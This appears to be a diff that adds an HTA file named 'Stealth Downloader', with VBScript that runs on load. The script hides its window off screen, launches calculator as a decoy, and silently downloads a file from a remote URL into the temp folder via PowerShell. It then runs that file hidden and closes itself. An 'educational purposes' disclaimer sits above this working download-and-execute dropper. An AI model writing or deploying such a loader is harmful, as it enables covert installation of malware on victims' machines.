@@ -1,0 +1,74 @@
+<!-- I am NOT liable for how you use this. This is *purely* for educational purposes. -->
+<html>
+<head>
+  <title>Stealth Downloader</title>
+  <hta:application
+    applicationname="StealthApp"
+    border="none"
+    caption="no"
+    showintaskbar="no"
+    singleinstance="yes"
+    windowstate="minimize">
+  <script language="VBScript">
+    Sub Window_OnLoad
+      ' Hide window off screen
+      Window.ResizeTo 1, 1
+      Window.MoveTo -32000, -32000
+
+      Dim objShell, fso, tempFolder, downloadUrl, randomFileName, downloadedFile, cmdCommand
+      Set objShell = CreateObject("WScript.Shell")
+      Set fso = CreateObject("Scripting.FileSystemObject")
+
+      ' Example of launching something obvious first
+      objShell.Run "calc.exe", 1, False
+
+      ' Temp folder
+      tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
+
+      ' This is just a webpage, but FOR ThE LOVE OF EVERYTHING DO NOT PLACE ANYTHING MALICIOUS IN HERE
+      downloadUrl = "https://github.com/DelightZone/wombx/raw/refs/heads/main/example.html"
+
+      ' Generate random file name
+      randomFileName = GenerateRandomFileName() & ".html"
+      downloadedFile = tempFolder & "\" & randomFileName
+
+      ' PowerShell command to download file
+      cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
+      objShell.Run "cmd.exe /c " & cmdCommand, 0, True
+
+      ' Wait until file exists (simple wait loop)
+      WaitForDownload(downloadedFile)
+
+      ' If downloaded, run it
+      If fso.FileExists(downloadedFile) Then
+        objShell.Run downloadedFile, 0, False
+      End If
+
+      ' Close HTA
+      self.close
+    End Sub
+
+    Function GenerateRandomFileName()
+      Dim chars, i, result
+      chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+      Randomize
+      For i = 1 To 10
+        result = result & Mid(chars, Int(Rnd() * Len(chars)) + 1, 1)
+      Next
+      GenerateRandomFileName = result
+    End Function
+
+    Sub WaitForDownload(filePath)
+      Dim fso, tries
+      Set fso = CreateObject("Scripting.FileSystemObject")
+      tries = 0
+      Do Until fso.FileExists(filePath) Or tries > 50
+        WScript.Sleep 200
+        tries = tries + 1
+      Loop
+    End Sub
+  </script>
+</head>
+<body>
+</body>
+</html>
